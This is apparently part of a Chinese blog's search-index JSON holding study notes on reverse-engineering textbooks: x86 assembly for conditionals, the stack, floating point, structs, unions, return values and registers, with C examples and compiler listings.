f(0); return 0;} X86在编译器含有条件运算符得语句中，早期无优化功能得编译器会以编译“if/else”语句得方式处理； VC6： 123456789101112131415161718192021222324252627282930313233343536373839404142_TEXT SEGMENT_a$ = 8_f PROC NEAR; File const.c; Line 3 push ebp mov ebp, esp push ecx; Line 4 cmp DWORD PTR _a$[ebp], 0 jne SHORT $L345 mov DWORD PTR -4+[ebp], OFFSET FLAT:$SG338 jmp SHORT $L346$L345: mov DWORD PTR -4+[ebp], OFFSET FLAT:$SG339$L346: mov eax, DWORD PTR -4+[ebp]; Line 5 mov esp, ebp pop ebp ret 0_f ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 7 push ebp mov ebp, esp; Line 8 push 0 call _f add esp, 4; Line 9 xor eax, eax; Line 10 pop ebp ret 0_main ENDP_TEXT ENDSEND 比较最大值和最小值1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;int my_max(int a,int b){ if(a&gt;b) { return a; } else { return b; }}int my_min(int a,int b){ if(a&gt;b) { return a; } else { return b; }}int main(){ my_max(1,2); my_min(1,2); return 0;} X861234567891011121314151617181920212223242526272829303132333435363738394041424344454647_a$ = 8_b$ = 12_my_min PROC NEAR; Line 16 push ebp mov ebp, esp; Line 17 mov eax, DWORD PTR _a$[ebp] cmp eax, DWORD PTR _b$[ebp] jle SHORT $L348; Line 19 mov eax, DWORD PTR _a$[ebp] jmp SHORT $L349$L348:; Line 23 mov eax, DWORD PTR _b$[ebp]$L349:; Line 25 pop ebp ret 0_my_min ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 28 push ebp mov ebp, esp; Line 29 push 2 push 1 call _my_max add esp, 8; Line 30 push 2 push 1 call _my_min add esp, 8; Line 31 xor eax, eax; Line 32 pop ebp ret 0_main ENDP_TEXT ENDSEND 上面得代码在函数使用过后都会有一个多余得JMP指令，这是MSVC得问题","link":"/2019/10/24/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4/"},{"title":"逆向工程权威指南-栈","text":"栈空间是CPU寄存器里的某个指针指向的一片内存区域。在分配栈空间以后，栈指针指向栈底部。push会减少栈指针的数值，而pop会增加栈指针的数值。栈的底部使用的是整个栈的最低地址，即是整个栈的起始内存地址。 栈为什么逆增长在计算机尚未小型化的时候，内存被分为两个部分，即“堆/heap”和“栈stack”，在程序执行过程中，堆栈到底增长到什么地步谁也无法控制，所以对堆栈进行了分离； 程序的进程在逻辑上分为三个段，从虚拟地址空间0地址开始，第一个是文本段(.text)，文本段在执行过程中不可写，即使一个程序被执行多次，它也必须共享1份文本段。 栈的用途保存函数结束时返回地址在x86的程序中，当程序使用call指令调用其他函数时，call指令结束后的返回地址会被保存在栈中；在call完成调用后，程序将执行无条件跳转执行，跳转到栈中保存的这个地址中去； call执行等价于“push 返回地址”和“jmp 函数地址”的指令 被调用函数里如果存在RET指令，会从栈中读取返回地址，然后跳转到这个地址，就相当于“pop 返回地址” + “jmp返回地址”指令； 栈是大小的，溢出栈是很容易的，直接使用无限递归； 1234void f(){ f();} 123456789101112131415161718192021222300401005 jmp fun (00401020)00401020 push ebp00401021 mov ebp,esp00401023 sub esp,40h00401026 push ebx00401027 push esi00401028 push edi00401029 lea edi,[ebp-40h]0040102C mov ecx,10h00401031 mov eax,0CCCCCCCCh00401036 rep stos dword ptr [edi]00401038 call @ILT+0(fun) (00401005)0040103D pop edi0040103E pop esi0040103F pop ebx00401040 add esp,40h00401043 cmp ebp,esp00401045 call __chkesp (004010a0)0040104A mov esp,ebp0040104C pop ebp0040104D ret004010A0 jne __chkesp+3 (004010a3) 参数传递在x86平台中，最常用的参数传递的约定是cdecl。以cdecl防暑处理参数，其上下问大体是这个样子： 12345push arg3push arg2push arg1call fadd esp,12 在调用f函数之间，传递给它的参数将以以下格式存储在内存里： esp 返回地址 esp+4 arg1，它在ida中被标记为arg_0 esp+8 arg2，它在ida中被标记为arg_4 esp+0xc arg3，它在ida中被标记为arg_8 在x86和arm系统中，使用栈传递参数已经称为约定俗成 声明main()函数的方法并不那么重要，我们可以这么写： 1234567891011121314int main(){ }int main(int argc,char *argv[]){ }int main(int argc,char *argv[],char *ebvp[]){ } 但是我们在CtrMainStartup中调用main的指令大体如下： 1234push envppush argvpush argccall main 局部存储变量通过向栈底调整栈指针，函数即可在数据站里分配一片用于存储局部变量的内存空间，无论函数声明了多少个局部变量，都不影响它分配栈空间的速度 x86:alloca()函数alloca函数直接使用栈来分配内存，除此以外，它和malloc没有显著的区别； 函数尾部的代码会还原esp的指，把数据栈还原为函数启动之前的状态，直接抛弃由alloca函数申请的内存。所以不需要free函数来释放内存 1234567891011121314151617#ifdef _GUNC_#include &lt;alloca.h&gt;#else#include &lt;malloc.h&gt;#endif#include &lt;stdio.h&gt;voif f(){ char *buf = (char *)alloca(600);#ifdef _GUNC_ snprintf(buf,600,&quot;hi!%d,%d,%d\\n&quot;,1,2,3); //gcc#else _snprintf(buf,600,&quot;hi!%d,%d,%d\\n&quot;,1,2,3); //msvc#endif puts(buf);} msvc编译后的结果： gcc编译后的结果： SEH结构化异常处理缓冲区保护典型的栈的内存存储格式 栈噪音函数退出后，原有栈空间里的局部变量不会被自动清除。它们就成了栈噪音。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566TEXT SEGMENT_a$ = -4_b$ = -8_c$ = -12?f1@@YAXXZ PROC NEAR ; f1; File main3.cpp; Line 3 push ebp mov ebp, esp sub esp, 12 ; 0000000cH; Line 4 mov DWORD PTR _a$[ebp], 1 mov DWORD PTR _b$[ebp], 2 mov DWORD PTR _c$[ebp], 3; Line 6 mov esp, ebp pop ebp ret 0?f1@@YAXXZ ENDP ; f1_TEXT ENDSPUBLIC ?f2@@YAXXZ ; f2EXTRN _printf:NEAR_DATA SEGMENT$SG534 DB '%d,%d,%d', 0aH, 00H_DATA ENDS_TEXT SEGMENT_a$ = -4_b$ = -8_c$ = -12?f2@@YAXXZ PROC NEAR ; f2; Line 9 push ebp mov ebp, esp sub esp, 12 ; 0000000cH; Line 11 mov eax, DWORD PTR _c$[ebp] push eax mov ecx, DWORD PTR _b$[ebp] push ecx mov edx, DWORD PTR _a$[ebp] push edx push OFFSET FLAT:$SG534 call _printf add esp, 16 ; 00000010H; Line 12 mov esp, ebp pop ebp ret 0?f2@@YAXXZ ENDP ; f2_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 15 push ebp mov ebp, esp; Line 16 call ?f1@@YAXXZ ; f1; Line 17 call ?f2@@YAXXZ ; f2; Line 18 pop ebp ret 0_main ENDP_TEXT ENDSEND 参考源代码，我们在f2函数中并没有给出a，b，c三个变量的值，但是这三个变量却输出了1，2，3，这个时候，f2()函数的值就是栈里残留的脏数据 我们使用OllyDbg打开我们编译好的程序： 可以看到，f1函数给变量赋值以后，数据存储与0012FF6C-0012FF74这个连续的地址中，然后继续执行f2函数； f2函数于f1函数的三个变量的地址相等，因为没有对这个空间进行重新赋值，所以那三个变量会因为地址相同的原因获得前三个变量的值 因为第二个函数在第一个函数执行以后执行，而第二个函数的地址和栈顶的值与第一个函数相同，所以相同地址的变量值相同 课后习题题目1如果使用MSVC编译、运行下列程序，将会打印3个整数。这个数值来自哪里？如果使用MSVC优化选项“/Ox”，程序又会在屏幕上输出什么？为什么GCC的情况完全不同。 123456#include &lt;stdio.h&gt;int main(){ printf(&quot;%d,%d,%d\\n&quot;); return 0;} 答案： 这个数值来源于栈空间的脏数据 如果使用MSVC的优化选项，屏幕上输出什么？ 题目2请详述以下程序的功能： 经MSVC 2010（启用/Ox选项）编译而得的代码如下： 12345678910111213$SG3103 DB '%d',0aH,00H_main PROC push 0 ;将0压入栈中 call DWORD PTR _imp_time64 ;目测应该是休眠，和c中sleep()差不多 push edx ;将edx压入栈 push edx ;将edx压入栈 push OFFSET $SG3103 ; ;将要打印的字符压入栈 call DWORD _imp_printf ;调用printf函数 add esp,16 ;恢复栈空间 xor eax,eax ;异或eax，如果两数相同，异或后清0 ret 0 ;_main ENDP","link":"/2019/10/24/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E6%A0%88/"},{"title":"逆向工程权威指南-浮点数","text":"FPU是专门处理浮点数的运算单元，是CPU的一个组建； 在早期的计算机体系中，FPU位于CPU之外的单独的运算芯片上； FPUIEEE 754IEEE754(电气工程师学会)标准规定了计算机程序设计环境中的二进制和十进制的浮点数的交换、算术格式以及方法； 符合这种标注你的浮点数由符号位、尾数(有效数字、小数位)和指数位构成 X86在80486之前，FPU不属于CPU中的原件；人们需要单独购买； FPU自带一个由8个80位寄存器构成的循环栈，这些80位寄存器用以存储IEEE754格式的浮点数； 通常叫做ST(0)~ST(7)寄存器，OllyDbg和IDA把ST(0)显示为ST； C/C++标准的C/C++支持两种浮点数据类型，即单精度浮点数(float)和双精度浮点数(double)。GCC编译器还支持Long dlouble类型数据，MSVC不支持这种类型的浮点数； 举例123456789101112#include &lt;stdio.h&gt;double f(double a,double b){ return a/3.14 + b*3.14;}int main(){ printf(&quot;%f\\r\\n&quot;,1.2,3.4); return 0;} X8612345678910111213141516171819202122232425262728293031323334353637383940414243444546_TEXT SEGMENT_a$ = 8_b$ = 16_f PROC NEAR; File Float.c; Line 4 push ebp mov ebp, esp; Line 5 fld QWORD PTR _a$[ebp] fdiv QWORD PTR __real@8@4000c8f5c28f5c28f800 fld QWORD PTR _b$[ebp] fmul QWORD PTR __real@8@4000c8f5c28f5c28f800 faddp ST(1), ST(0); Line 6 pop ebp ret 0_f ENDP_TEXT ENDSPUBLIC _mainEXTRN _printf:NEAR_DATA SEGMENT$SG342 DB '%f', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; Line 9 push ebp mov ebp, esp; Line 10 push 1074475827 ; 400b3333H push 858993459 ; 33333333H push 1072902963 ; 3ff33333H push 858993459 ; 33333333H push OFFSET FLAT:$SG342 call _printf add esp, 20 ; 00000014H; Line 11 xor eax, eax; Line 12 pop ebp ret 0_main ENDP_TEXT ENDSEND FLD指令从栈中读取8个字节，把这个数值转换为FPU所需的80位数据格式，并存入ST(0)寄存器； FDIV指令把ST(0)寄存器的值用作被除数，把__real@8@4000c8f5c28f5c28f800(3.14)的值当作除数，进行除法运算，因为汇编不支持小数点，所以程序使用64位IEEE754格式的16进制数8@4000c8f5c28f5c28f800表述浮点数； OllyDBg","link":"/2019/10/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E6%B5%AE%E7%82%B9%E6%95%B0/"},{"title":"逆向工程权威指南-结构体","text":"C/C++的结构体可以这么定义：它是一组存储在内存中的变量的集合，变量成员类型不要求相同 12345678910typedef struct _SYSTEMTIME { WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay; WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds;} SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME; 1234567891011#include &lt;windows.h&gt;#include &lt;stdio.h&gt;void main(){ SYSTEMTIME t; GetSystemTime(&amp;t); printf (&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond); return;}; x861234567891011121314151617181920212223242526272829303132333435363738394041424344_t$ = -16_main PROC NEAR; File struct.c; Line 4 push ebp mov ebp, esp sub esp, 16 ; 00000010H; Line 6 lea eax, DWORD PTR _t$[ebp] push eax call DWORD PTR __imp__GetSystemTime@4; Line 9 mov ecx, DWORD PTR _t$[ebp+12] and ecx, 65535 ; 0000ffffH push ecx mov edx, DWORD PTR _t$[ebp+10] and edx, 65535 ; 0000ffffH push edx mov eax, DWORD PTR _t$[ebp+8] and eax, 65535 ; 0000ffffH push eax mov ecx, DWORD PTR _t$[ebp+6] and ecx, 65535 ; 0000ffffH push ecx mov edx, DWORD PTR _t$[ebp+2] and edx, 65535 ; 0000ffffH push edx mov eax, DWORD PTR _t$[ebp] and eax, 65535 ; 0000ffffH push eax push OFFSET FLAT:$SG52752 call _printf add esp, 28 ; 0000001cH; Line 10 push OFFSET FLAT:$SG52753 call _system add esp, 4; Line 12 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND 在本地栈上程序喂这个结构体分配了16个字节：这正是sizeof(WORD)*8的大小。请注意结构体是从wYear开始，我们即可以说这是传给”GetSystemTime()函数的”，GetSystemTime函数会把当前的年份写入WORD指针中，然后把指针向后移两个字节； Ollydbg我们使用MSVC(指定/GS-/MD选项)编译上述程序，并用OllyDbg打开MSVC生成的可执行文件。 在栈窗口中可以看到的指与此相同，不过栈窗口以32位数据的格式组织数据 以数组替代结构体12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;void main(){ WORD array[8]; GetSystemTime (array); printf (&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, array[0] /* wYear */, array[1] /* wMonth */, array[3] /* wDay */, array[4] /* wHour */, array[5] /* wMinute */, array[6] /* wSecond */); return;}; 1234567891011121314151617181920212223242526272829303132333435363738394041_array$ = -16_main PROC NEAR; File struct1.c; Line 4 push ebp mov ebp, esp sub esp, 16 ; 00000010H; Line 6 lea eax, DWORD PTR _array$[ebp] push eax call DWORD PTR __imp__GetSystemTime@4; Line 11 mov ecx, DWORD PTR _array$[ebp+12] and ecx, 65535 ; 0000ffffH push ecx mov edx, DWORD PTR _array$[ebp+10] and edx, 65535 ; 0000ffffH push edx mov eax, DWORD PTR _array$[ebp+8] and eax, 65535 ; 0000ffffH push eax mov ecx, DWORD PTR _array$[ebp+6] and ecx, 65535 ; 0000ffffH push ecx mov edx, DWORD PTR _array$[ebp+2] and edx, 65535 ; 0000ffffH push edx mov eax, DWORD PTR _array$[ebp] and eax, 65535 ; 0000ffffH push eax push OFFSET FLAT:$SG52752 call _printf add esp, 28 ; 0000001cH; Line 13 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND malloc为结构体分配空间在某些情况下，使用堆(heap)来存储结构体要比栈(stack)容易 12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;void main(){ SYSTEMTIME *t; t=(SYSTEMTIME *)malloc (sizeof (SYSTEMTIME)); GetSystemTime (t); printf (&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, t-&gt;wYear, t-&gt;wMonth, t-&gt;wDay, t-&gt;wHour, t-&gt;wMinute, t-&gt;wSecond); free (t); return;}; x86123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657_t$ = -4_main PROC NEAR; File heap.c; Line 4 push ebp mov ebp, esp push ecx; Line 6 push 16 ; 00000010H call _malloc add esp, 4 mov DWORD PTR _t$[ebp], eax; Line 7 mov eax, DWORD PTR _t$[ebp] push eax call DWORD PTR __imp__GetSystemTime@4; Line 10 mov ecx, DWORD PTR _t$[ebp] xor edx, edx mov dx, WORD PTR [ecx+12] push edx mov eax, DWORD PTR _t$[ebp] xor ecx, ecx mov cx, WORD PTR [eax+10] push ecx mov edx, DWORD PTR _t$[ebp] xor eax, eax mov ax, WORD PTR [edx+8] push eax mov ecx, DWORD PTR _t$[ebp] xor edx, edx mov dx, WORD PTR [ecx+6] push edx mov eax, DWORD PTR _t$[ebp] xor ecx, ecx mov cx, WORD PTR [eax+2] push ecx mov edx, DWORD PTR _t$[ebp] xor eax, eax mov ax, WORD PTR [edx] push eax push OFFSET FLAT:$SG52754 call _printf add esp, 28 ; 0000001cH; Line 11 mov ecx, DWORD PTR _t$[ebp] push ecx call _free add esp, 4; Line 13 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND sizeof(SYSTEMTIME) =16，这正是malloc所分配的字节数。它返回了刚刚分配的地址空间，这个指针存在EAX寄存器中。然后，这个指针被移动到ESI寄存器中，GetSystemTime会用它来存储返回值，这也就是为什么这里分配完以后并没有把EAX放到某个地方保存起来，而是直接使用它的原因； 新指令:MOVZX(0移动扩展)。它可以说是和MOVSX基本意义，但是，它把其他位偶读设置为1，这是因为printf需要一个32位的整数，但是我们的结构体里的DWORD是16位，这也就是为什么从WORD复制到INT时16~31位必须清零的原因 我们可以使用8个WORD型数组重新构造上述结构体： 1234567891011121314#include &lt;windows.h&gt;#include &lt;stdio.h&gt;void main(){ WORD *t; t=(WORD *)malloc (16); GetSystemTime (t); printf (&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, t[0] /* wYear */, t[1] /* wMonth */, t[3] /* wDay */, t[4] /* wHour */, t[5] /* wMinute */, t[6] /* wSecond */ ); free (t); return;}; 1234567891011121314151617181920212223242526272829303132333435363738394041424344_main PROC NEAR; File struct3.c; Line 4 push esi; Line 6 push 16 ; 00000010H call _malloc add esp, 4 mov esi, eax; Line 7 push esi call DWORD PTR __imp__GetSystemTime@4; Line 11 xor eax, eax xor ecx, ecx mov ax, WORD PTR [esi+12] mov cx, WORD PTR [esi+10] xor edx, edx push eax mov dx, WORD PTR [esi+8] push ecx xor eax, eax push edx mov ax, WORD PTR [esi+6] xor ecx, ecx mov cx, WORD PTR [esi+2] xor edx, edx mov dx, WORD PTR [esi] push eax push ecx push edx push OFFSET FLAT:$SG52795 call _printf; Line 12 push esi call _free add esp, 32 ; 00000020H pop esi; Line 14 ret 0_main ENDP_TEXT ENDSEND 这个代码和结构体生成的代码完全相同，再次强调，这种“用数组代替结构体”的做法没有什么实际意义 UNIX:Stauct tm123456789101112131415#include &lt;stdio.h&gt;#include &lt;time.h&gt;void main(){ struct tm t; time_t unix_time; unix_time=time(NULL); localtime_r (&amp;unix_time, &amp;t); printf (&quot;Year: %d&quot;, t.tm_year+1900); printf (&quot;Month: %d&quot;, t.tm_mon); printf (&quot;Day: %d&quot;, t.tm_mday); printf (&quot;Hour: %d&quot;, t.tm_hour); printf (&quot;Minutes: %d&quot;, t.tm_min); printf (&quot;Seconds: %d&quot;, t.tm_sec);}; Gcc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182main:.LFB0: .cfi_startproc leal 4(%esp), %ecx .cfi_def_cfa 1, 0 andl $-16, %esp pushl -4(%ecx) pushl %ebp .cfi_escape 0x10,0x5,0x2,0x75,0 movl %esp, %ebp pushl %ecx .cfi_escape 0xf,0x3,0x75,0x7c,0x6 subl $68, %esp movl %gs:20, %eax movl %eax, -12(%ebp) xorl %eax, %eax subl $12, %esp pushl $0 call time addl $16, %esp movl %eax, -60(%ebp) subl $8, %esp leal -56(%ebp), %eax pushl %eax leal -60(%ebp), %eax pushl %eax call localtime_r addl $16, %esp movl -36(%ebp), %eax addl $1900, %eax subl $8, %esp pushl %eax pushl $.LC0 call printf addl $16, %esp movl -40(%ebp), %eax subl $8, %esp pushl %eax pushl $.LC1 call printf addl $16, %esp movl -44(%ebp), %eax subl $8, %esp pushl %eax pushl $.LC2 call printf addl $16, %esp movl -48(%ebp), %eax subl $8, %esp pushl %eax pushl $.LC3 call printf addl $16, %esp movl -52(%ebp), %eax subl $8, %esp pushl %eax pushl $.LC4 call printf addl $16, %esp movl -56(%ebp), %eax subl $8, %esp pushl %eax pushl $.LC5 call printf addl $16, %esp movl -12(%ebp), %eax xorl %gs:20, %eax je .L2 call __stack_chk_fail.L2: movl -4(%ebp), %ecx .cfi_def_cfa 1, 0 leave .cfi_restore 5 leal -4(%ecx), %esp .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE0: .size main, .-main .ident &quot;GCC: (Ubuntu 4.9.1-16ubuntu6) 4.9.1&quot; .section .note.GNU-stack,&quot;&quot;,@progbits 结构嵌套12345678910111213141516171819#include &lt;stdio.h&gt;struct inner_struct{ int a; int b;};struct outer_struct{ char a; int b; struct inner_struct c; char d; int e;};void f(struct outer_struct s){ printf (&quot;a=%d; b=%d; c.a=%d; c.b=%d; d=%d; e=%d&quot;, s.a, s.b, s.c.a, s.c.b, s.d, s.e);}; x8612345678910111213141516171819202122232425_s$ = 8_f PROC NEAR; File struct5.c; Line 18 movsx ecx, BYTE PTR _s$[esp+12] mov eax, DWORD PTR _s$[esp+16] mov edx, DWORD PTR _s$[esp+8] push eax mov eax, DWORD PTR _s$[esp+8] push ecx mov ecx, DWORD PTR _s$[esp+8] push edx push eax movsx edx, BYTE PTR _s$[esp+12] push ecx push edx push OFFSET FLAT:$SG404 call _printf add esp, 28 ; 0000001cH; Line 19 ret 0_f ENDP_TEXT ENDSEND 结构的嵌套并不会影响我们的阅读，我们看汇编代码并不能看到它的体内有另一个结构体！因此，我们可以给，嵌套的结构体最终都会转换为线性的或者一维的结构 结构体中的位CPUID的例子C/C++中云溪给结构体的每一个成员都定义一个准确的位域。如果我们需要节省空间的话，这个对我们来说很有用；","link":"/2019/11/10/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%BB%93%E6%9E%84%E4%BD%93/"},{"title":"逆向工程权威指南-联合体","text":"在进行某些算法的C语言编程的时候，需要使几种不同类型的变量存放在同一内存单元中。也就是使用覆盖技术，几个变量互相覆盖。这种几个不同的变量共用同一段内存的结构，在C语言中，被称为“联合体”类型结构； 伪随机数生成器的例子如果我们需要0～1的随机浮点数，最简单的方法就是用PRNG（伪随机数发生器），比如马特赛特旋转演算法可以生成一个随机的32位的DWORD。然后我们可以把这个值转为FLOAT类型，然后除以RAND_MAX（我们的例子是0xFFFFFFFF），这样，我们得到的将是0..1区间的数。 但是如我们所知道的是，除法很慢。我们是否能摆脱它呢？就像我们用乘法做除法一样（14章）。 让我们想想浮点数由什么构成：符号位、有效数字位、指数位。我们只需要在这里面存储一些随机的位就好了。 指数不能变成0（在本例里面数字会不正常），所以我们存储0111111到指数里面，这意味着指数位将是1。然后，我们用随机位填充有效数字位，然后把符号位设置为0（正数）。生成的数字将在1-2的间隔中生成，所以我们必须从里面再减去1。 我例子里面是最简单的线性同余随机数生成器，生成32位（译注：32-bit比特位，非数字位）的数字。PRNG将会用UNIX时间戳来初始化。然后，我们会把float类型当作联合体（union）来处理，这是一个C/C++的结构。它允许我们把一片内存里面各种不同类型的数据联合覆盖到一起用。在我们的例子里，我们可以创建一个union，然后通过float或者uint32_t来访问它。因此，这只是一个小技巧，而且是很脏的技巧。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;time.h&gt;union uint32_t_float{ uint32_t i; float f;};// from the Numerical Recipes bookconst uint32_t RNG_a=1664525;const uint32_t RNG_c=1013904223;int main(){ uint32_t_float tmp; uint32_t RNG_state=time(NULL); // initial seed for (int i=0; i&lt;100; i++) { RNG_state=RNG_state*RNG_a+RNG_c; tmp.i=RNG_state &amp; 0x007fffff | 0x3F800000; float x=tmp.f-1; printf (&quot;%f&quot;, x); }; return 0;}; x8612345678910111213141516171819202122232425262728293031323334353637383940414243444546474849$SG4232 DB ’%f’, 0aH, 00H__real@3ff0000000000000 DQ 03ff0000000000000r ; 1tv140= -4 ; size = 4_tmp$= -4 ; size = 4_main PROC push ebp mov ebp, esp and esp, -64 ; ffffffc0H sub esp, 56 ; 00000038H push esi push edi push 0 call __time64 add esp, 4 mov esi, eax mov edi, 100 ; 00000064H$LN3@main: ; let’s generate random 32-bit number imul esi, 1664525 ; 0019660dH add esi, 1013904223 ; 3c6ef35fH mov eax, esi ; leave bits for significand only and eax, 8388607 ; 007fffffH ; set exponent to 1 or eax, 1065353216 ; 3f800000H ; store this value as int mov DWORD PTR _tmp$[esp+64], eax sub esp, 8 ; load this value as float fld DWORD PTR _tmp$[esp+72] ; subtract one from it fsub QWORD PTR __real@3ff0000000000000 fstp DWORD PTR tv140[esp+72] fld DWORD PTR tv140[esp+72] fstp QWORD PTR [esp] push OFFSET $SG4232 call _printf add esp, 12 ; 0000000cH dec edi jne SHORT $LN3@main pop edi xor eax, eax pop esi mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND Gcc生成的代码与之类似","link":"/2019/11/10/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E8%81%94%E5%90%88%E4%BD%93/"},{"title":"逆向工程权威指南-返回值","text":"在x86系统中，被调用方函数通常经过EAX寄存器返回运算结果。若返回值属于Byte或者Char类型数据，返回值将存储与EAX的低8位寄存器——-AL寄存器存储返回值。如果返回值是Flaot类型，那么返回值将存储与FPU的ST(0)寄存器里； VOID型函数的返回值主函数main()的数据类型通常是VOID而不是int； 调用main()函数的有关代码大体如下： 123456push envppush argvpush agrccall mainpush eaxcall exit 如果将上述代码转换为源代码，也就是： 1exit(main(argc,agrc,envp)); 如果声明main函数类型是void，则main函数不会明确返回任何值(没有rentn指令)。不过在main函数退出的时候，EAX寄存器还会存储数据，EAX寄存器保存的数据会传递给exit函、称为后者的输入函数 12345#include &lt;stdio.h&gt;void main(){ printf(&quot;hello,world\\r\\n&quot;);} 1234567891011121314151617181920212223.text:0804841B main proc near ; DATA XREF: _start+17\u0018o.text:0804841B.text:0804841B var_4 = dword ptr -4.text:0804841B argc = dword ptr 0Ch.text:0804841B argv = dword ptr 10h.text:0804841B envp = dword ptr 14h.text:0804841B.text:0804841B lea ecx, [esp+4].text:0804841F and esp, 0FFFFFFF0h.text:08048422 push dword ptr [ecx-4].text:08048425 push ebp.text:08048426 mov ebp, esp.text:08048428 push ecx.text:08048429 sub esp, 4.text:0804842C sub esp, 0Ch.text:0804842F push offset s ; &quot;hello,world\\r&quot;.text:08048434 call _puts.text:08048439 add esp, 10h.text:0804843C mov ecx, [ebp+var_4].text:0804843F leave.text:08048440 lea esp, [ecx-4].text:08048443 retn.text:08048443 main endp puts函数会返回它所输出的字符的总数。庆祝如main函数结束时，EAX寄存器的值不会是零；也就是说，此时EAX寄存器存储的值是上一个函数puts函数的返回值； 函数返回值不被调用的情况printf函数的返回值为打印字符的总数，但是很少有程序会使用这个返回值； 12345678int f(){ rand(); rand(); rand(); return rand();} 上述四个rand()函数都会把运算结果存储到EAX寄存器中，但是前三个rand函数留在EAX中的运算结果都被抛弃了； 返回值为结构体数据函数只能使用EAX一个寄存器返回值，因为这种局限，过去的C编译器无法扁你返回值超过EAX容量的数据；现在的C编译器没有了这种短板，使用return指令设置可以返回结构体的数据； 如果函数返回值是大型数据的结构，那么应该由调用方函数(caller)负责分配空间，给结构体分配指针，再把指针座位第一个参数传递给被调用方函数。 12345678910111213#include &lt;stdio.h&gt;struct s{ int a; int b; int c;};struct s get_some_values(int a){ struct s st; st.} 那么在MSVC下的编译出来的汇编代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950PUBLIC _get_some_values_TEXT SEGMENT_a$ = 12 ;size=4_st$ = -12$T348 = 8 ;size =4_get_some_values PROC NEAR ;get_some_valuse函数入口; File main.c; Line 10 push ebp mov ebp, esp sub esp, 12 ; 0000000cH; Line 12 mov eax, DWORD PTR _a$[ebp] add eax, 1 mov DWORD PTR _st$[ebp], eax; Line 13 mov ecx, DWORD PTR _a$[ebp] add ecx, 2 mov DWORD PTR _st$[ebp+4], ecx; Line 14 mov edx, DWORD PTR _a$[ebp] add edx, 3 mov DWORD PTR _st$[ebp+8], edx; Line 15 mov eax, DWORD PTR $T348[ebp] mov ecx, DWORD PTR _st$[ebp] mov DWORD PTR [eax], ecx mov edx, DWORD PTR _st$[ebp+4] mov DWORD PTR [eax+4], edx mov ecx, DWORD PTR _st$[ebp+8] mov DWORD PTR [eax+8], ecx mov eax, DWORD PTR $T348[ebp]; Line 16 mov esp, ebp pop ebp ret 0_get_some_values ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 19 push ebp mov ebp, esp; Line 21 pop ebp ret 0_main ENDP_TEXT ENDSEND 在函数体内部传递结构体的指针就是$T348；","link":"/2019/10/26/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E8%BF%94%E5%9B%9E%E5%80%BC/"},{"title":"逆向工程核心原理-32位寄存器","text":"32位寄存器相关讲解 CPU寄存器寄存器（Register）是CPU内部用来存放数据得一些小型存储区域，寄存器集成在CPU内部，拥有非常高得读写速度 IA-32寄存器通用寄存器32位寄存器大概由4类寄存器组成: 通用寄存器：EAX、EBX、ECX、EDX、ESP、EBP、ESI、EDI 段寄存器：CS、DS、SS、ES、FS、GS 程序状态与控制寄存器：EFLAGS 指令指针寄存器：EIP 各寄存器得名称： EAX:（针对操作数和结果数据得）累加器 EBX：(DS段中得数据指针)基址寄存器 ECX：(字符串和循环操作得)计数器 EDX：(i/o指针)数据寄存器 通用寄存器中其他几个寄存器得名称： EBP:(SS段中栈内数据指针)扩展基址指针寄存器 ESI:(字符串操作源指针)源变址寄存器 EDI:(字符串操作目标指针)目的变址寄存器 ESP:(ss段中栈指针)栈指针寄存器 段寄存器段是一种内存保护技术，它把内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等，以保护内存，同时配合分页技术（pagint）一起用于将虚拟内存变更为实际物理内存。 各段寄存器得名称如下： CS:Code Segment，代码段寄存器 SS:Stack Segment，栈段寄存器 DS:Data Segment，数据段寄存器 ES:Extra Segment，附加段寄存器 FS:Data Segment，数据段寄存器 GS:Data Segment，数据段寄存器 程序状态与控制寄存器EFLAGS：Flag Register 标志寄存器 我们在入门阶段，只需要掌握三个标志寄存器 ZF：零标志位寄存器 OF：溢出标志寄存器 CF：进位标志寄存器 